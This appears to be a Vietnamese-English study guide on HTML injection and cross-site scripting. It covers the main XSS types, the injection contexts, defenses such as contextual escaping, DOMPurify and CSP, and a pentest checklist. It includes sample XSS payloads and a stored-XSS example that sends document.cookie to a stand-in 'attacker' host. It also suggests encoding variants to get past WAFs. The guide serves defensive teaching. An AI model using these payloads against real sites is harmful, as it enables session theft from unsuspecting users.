
# Tổng quan: HTML Injection vs XSS

* **HTML Injection**: attacker được phép đưa vào chuỗi HTML (ví dụ `<b>`, `<img>`, `<script>`), làm thay đổi layout hoặc hiển thị nội dung không mong muốn. Không nhất thiết chứa mã JS — có thể chỉ là chèn markup.
* **XSS (Cross-Site Scripting)**: một dạng HTML Injection **khi attacker có thể chèn mã JavaScript** hoặc tạo điều kiện để mã độc thực thi trong trình duyệt nạn nhân. Mục tiêu thường là đánh cắp cookie/session, CSRF nâng cao, DOM tampering, redirect, keylogger, crypto-jacking, v.v.

Sơ đồ ngắn:
Input không an toàn → được render trong HTML/attribute/JS/URL → mã attacker chạy => XSS.

# Các dạng XSS (chi tiết, cách nhận biết & ví dụ)

## 1) Reflected XSS (Non-persistent)

* **Mô tả:** payload đi kèm request (query string, POST, header) và server "reflected" trực tiếp payload vào response. Không lưu trên server.
* **Khi nào xảy ra:** search pages, error messages, redirect parameters, any echo of user input.
* **Ví dụ (vulnerable):**

  ```html
  <!-- server trả về -->
  <p>Search result for: <?php echo $_GET['q']; ?></p>
  ```

  Nếu `q=%3Cscript%3Ealert(1)%3C%2Fscript%3E` => alert chạy.
* **Dò kiểm thử:** thử payload trong URL, kiểm tra response HTML, dùng Burp Repeater.

## 2) Stored XSS (Persistent)

* **Mô tả:** attacker lưu payload vào DB (comment, profile, message) — payload sẽ được hiển thị cho các user khác => potent.
* **Ví dụ:** form comment lưu `"<script>fetch('https://attacker?c='+document.cookie)</script>"`. Khi admin xem comment, cookie bị leak.
* **Dò kiểm thử:** kiểm tra mọi chỗ lưu dữ liệu: comment, profile bio, upload filename, DB fields.

## 3) DOM-based XSS (Client-side)

* **Mô tả:** server trả HTML không chứa payload, nhưng JavaScript ở client-side lấy input (location.hash, document.location, document.referrer, innerHTML từ user-controlled data) và gán vào DOM mà không sanitize — payload thực thi hoàn toàn ở client. Không cần server-side vulnerable echo.
* **Ví dụ (vulnerable client code):**

  ```js
  // nguy hiểm
  document.getElementById('out').innerHTML = location.hash.substring(1);
  ```

  `page.html#<img src=x onerror=alert(1)>` → chạy.
* **Dò kiểm thử:** kiểm tra scripts trên page, search uses of `innerHTML`, `document.write`, `eval`, `setInnerHTML`, `location`, `document.referrer`, `postMessage` handlers.

## 4) Self-XSS (social-engineered)

* **Mô tả:** dạng lừa người dùng paste mã độc vào console; ít gặp phỏng vấn, nhưng phải biết.
* **Phòng tránh:** giáo dục user; không hỗ trợ paste từ unknown sources.

## 5) Mutation XSS / Polyglot / Bypass variants

* **Mô tả:** tận dụng khả năng parser HTML/DOM biến đổi payload; dùng đa dạng encoding (UTF-7, 0x0A, HTML entities), nested tags, SVG, `<svg onload=...>`, CSS expressions (IE), `javascript:` in href, `data:` URIs, `srcdoc` iframe, template injections, v.v.
* **Dò kiểm thử:** thử nhiều encoding, different contexts, và DOM mutation scenarios.

# Contexts — nơi XSS xuất hiện (quan trọng để encode đúng)

Khi encoding/escaping phải biết context nơi dữ liệu được chèn:

1. **HTML body (between tags)** — ví dụ: `<div>USER</div>` → encode HTML entities.
2. **HTML attribute** — ví dụ: `<img src="USER">` → encode attribute (quote-aware).
3. **Unquoted attribute** — nguy hiểm hơn; tránh.
4. **JavaScript context** — ví dụ: `<script>var a = 'USER';</script>` → cần JS string-escaping.
5. **URL context** — trong href/src; phải URL-encode + validate scheme.
6. **CSS context** — `style="background-image: url(USER)"` → CSS escaping.
7. **DOM sinks** — client-side sinks (`innerHTML`, `outerHTML`, `document.write`, `eval`, `setAttribute`, `location`, `assign`) — xử lý đặc biệt.

# Payload mẫu (dùng cho lab/permission-only)

* Simple reflected: `?q=<script>alert(1)</script>`
* Attribute injection: `"><script>alert(1)</script>` (gây phá attribute)
* Image onerror: `<img src=x onerror=alert(1)>`
* JS context: `' ); alert(1); ( ' ` (khi gán vào JS string)
* DOM hash payload: `#<img src=x onerror=alert(1)>` for DOM-based.

> **Ghi chú:** payload phức tạp dễ bị WAF/filters — dùng Burp + encoding variants khi thử.

# Cách phòng ngừa (defense-in-depth) — cụ thể & dễ nhớ

> Nguyên tắc tổng: **Never trust input. Escape at output. Apply contextual encoding. Use safe APIs. Defense-in-depth.**

## 1) Output encoding / escaping (primary)

* **Luôn encode dữ liệu khi output, theo context**:

  * HTML body: escape `<` `>` `&` `"` `'` → dùng HTML entity encoding.
  * Attribute: quote attribute and escape quotes & angle-brackets.
  * JS: JS string escape (e.g., `\xHH`), hoặc better: avoid inserting user data into JS code.
  * URL: URL-encode and validate scheme.
  * CSS: CSS escape if inside style.
* **Thư viện**: dùng thư viện trusted (framework auto-escape): e.g., Razor, Django templates, Jinja2 (autoescape on), React (dangerouslySetInnerHTML only with clean data).

## 2) Context-aware sanitization (only when you must allow HTML)

* Nếu cần cho user nhập rich text (HTML), **sanitize** bằng thư viện whitelist (DOMPurify, OWASP Java HTML Sanitizer).
* Không dùng regex để lọc HTML. Luôn sanitize **server-side** và **client-side** nếu có.

## 3) Use safe APIs — avoid unsafe sinks

* **Avoid** `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `new Function(...)`.
* Use `textContent` / `innerText` / `.value` / `.setAttribute()` with safe values.
* For building DOM, use `createElement`, `appendChild`, `textContent`.

## 4) Content Security Policy (CSP)

* **CSP** giúp giảm impact: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...';`
* Use nonces or hashes for inline scripts. CSP is a mitigation — not replacement for escaping. CSP can block inline `<script>` and `eval` and external bad scripts.

## 5) HTTP-only, Secure, SameSite cookies

* `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict` → JS không thể đọc cookie (chặn cookie theft). Nhưng note: XSS vẫn nguy hiểm (keystroke capture, actions).

## 6) Input validation & allow-listing

* Validate type/length/format on **server-side**. But **validation ≠ escaping**. Validation reduces attack surface (e.g., numeric IDs only). Use allowlists not blacklists.

## 7) Output encoding libraries & frameworks

* Use template engines with **auto-escaping** (React/Angular/Vue do auto-escape by default for bindings), but be careful with constructs that bypass auto-escape (e.g., `v-html`, `dangerouslySetInnerHTML`).

## 8) Sanitize filenames, safe file uploads

* When showing filenames as HTML, escape them. Rename files on upload to safe names.

## 9) Secure headers

* `X-XSS-Protection` historically used; modern browsers rely on CSP and proper escaping. Still consider security headers.

## 10) Logging & Monitoring

* Log suspicious inputs and alerts. Monitor WAF, SIEM for spikes in script-like inputs.

# Practical secure-coding examples (ngắn)

* **Unsafe (vulnerable):**

  ```php
  echo "<div>".$_GET['name']."</div>";
  ```
* **Safe:**

  ```php
  // PHP (use htmlspecialchars)
  echo "<div>" . htmlspecialchars($_GET['name'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</div>";
  ```
* **JS DOM safe (avoid innerHTML):**

  ```js
  // unsafe
  element.innerHTML = userInput;

  // safe
  element.textContent = userInput;
  ```
* **Allow limited HTML (use DOMPurify):**

  ```js
  // browser side
  const clean = DOMPurify.sanitize(userHtml);
  element.innerHTML = clean;
  ```

# Testing checklist cho XSS (pentest / dev-sec)

*  Tìm tất cả input vectors: query, POST, headers, cookies, referer, user profile, filenames, DB fields.
*  Test reflected: inject payload in URL / form -> check response.
*  Test stored: submit payload to saveable inputs -> view as different user.
*  Test DOM-based: inspect client JS for sinks (`innerHTML`, `document.write`, `eval`, `setAttribute`, `location.hash`, `postMessage` handlers).
*  Test context-sensitive payloads (HTML, attribute, JS, URL, CSS).
*  Test event handlers, SVG, `data:` URIs, `javascript:` links, template engines.
*  Test encoding: HTML entities, URL encoding, UTF-8 weirdness.
*  Verify fixes: use automated scanners + manual tests.
*  Check cookies flags, CSP presence & effectiveness.
